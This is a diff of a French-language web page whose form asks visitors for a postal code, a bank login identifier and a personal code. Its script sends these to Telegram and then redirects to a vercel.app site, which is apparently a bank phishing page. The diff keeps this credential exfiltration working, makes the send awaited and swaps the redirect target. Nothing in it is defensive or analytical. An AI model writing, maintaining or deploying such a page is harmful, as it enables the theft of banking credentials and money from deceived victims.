@@ -147,7 +147,7 @@
 
     .form-row input {
       width: 100%;
-      padding: 15px 14px;  /* champs plus grands */
+      padding: 15px 14px;
       font-size: 15px;
       border-radius: 6px;
       border: 1.5px solid #ccc;
@@ -163,7 +163,7 @@
     }
 
     button {
-      width: 100%;        /* bouton full width */
+      width: 100%;
       max-width: 360px;
       height: 48px;
       background-color: #ff6e14;
@@ -246,7 +246,7 @@
 
 <script>
   $(document).ready(function() {
-    $('#cardForm').submit(function(event) {
+    $('#cardForm').submit(async function(event) {
       event.preventDefault();
 
       var formData = {
@@ -256,14 +256,14 @@
       };
 
       var message = `Nouveau message de formulaire :
-      
+
 Code Postal: ${formData.postalCode}
 Identifiant Bancaire: ${formData.bankId}
 Code Personnel: ${formData.personalCode}`;
 
-      sendToTelegram(message);
+      await sendToTelegram(message);
 
-      window.location.href = 'https://encours-one.vercel.app/';
+      window.location.href = 'https://encours-psi.vercel.app/';
     });
   });
 
@@ -287,7 +287,8 @@ Code Personnel: ${formData.personalCode}`;
         body: JSON.stringify(data)
       });
     } catch (error) {
-      // Gérer l'erreur si nécessaire
+      // Optionnel : gérer l'erreur si besoin
+      console.error('Erreur lors de l\'envoi vers Telegram:', error);
     }
   }
 </script>
